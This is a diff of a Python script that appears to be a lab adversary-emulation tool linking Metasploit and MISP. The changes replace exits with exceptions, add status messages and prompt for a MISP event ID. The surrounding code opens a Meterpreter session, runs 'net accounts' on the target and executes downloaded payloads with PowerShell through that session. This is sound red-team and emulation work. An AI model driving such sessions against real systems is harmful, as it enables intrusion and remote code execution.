@@ -34,8 +34,7 @@ def init_msf():
         print("[*] Connected to Metasploit")
         return client
     except Exception as e:
-        print("[-] Failed to connect to Metasploit")
-        exit(0)
+        raise Exception("[-] Failed to connect to Metasploit")
     return None
 
 # Initialize MISP Connection
@@ -46,8 +45,7 @@ def init_misp():
         print("[*] Connected to MISP")
         return misp
     except Exception as e:
-        print("[-] Failed to connect to MISP")
-        exit(0)
+        raise Exception("[-] Failed to connect to MISP")
     return None
 
 # Read a given MISP event
@@ -96,6 +94,7 @@ def download_misp_payload(payload, execute=True):
         main_msf_session_key = list(sessions.keys())[0]
         print(f"[*] Selecting Session {main_msf_session_key}")
         shell = MSF_CLIENT.sessions.session(main_msf_session_key)
+        print("[*] Executing payload")
         output = shell.run_shell_cmd_with_output(f"powershell.exe C:\\Users\\vagrant\\vagrant_data\\payloads\\{name}", None, exit_shell=False)
         print(output)
 
@@ -116,12 +115,13 @@ def meterpreter_connect():
     console.run_module_with_output(exploit, payload=payload)
 
     print()
-    print("[*] Running shell commands:\n")
+    print("[*] Connection successful\n")
     sessions = MSF_CLIENT.sessions.list
     main_msf_session_key = list(sessions.keys())[0]
     main_msf_session = sessions[main_msf_session_key]
     print(f"[*] Selecting Session {main_msf_session_key}")
     shell = MSF_CLIENT.sessions.session(main_msf_session_key)
+    print("[*] Testing shell command\n")
     print(shell.run_shell_cmd_with_output("net accounts", None))  
 
 def execute_attck(attck_id):
@@ -140,6 +140,10 @@ def main():
     MSF_CLIENT = init_msf()
     MISP_CLIENT = init_misp()
     meterpreter_connect()
-    read_misp_event(4)
+    
+    print()
+    event_id = input("[*] Input MISP Event ID to emulate: ")
+    
+    read_misp_event(event_id)
 
 main()
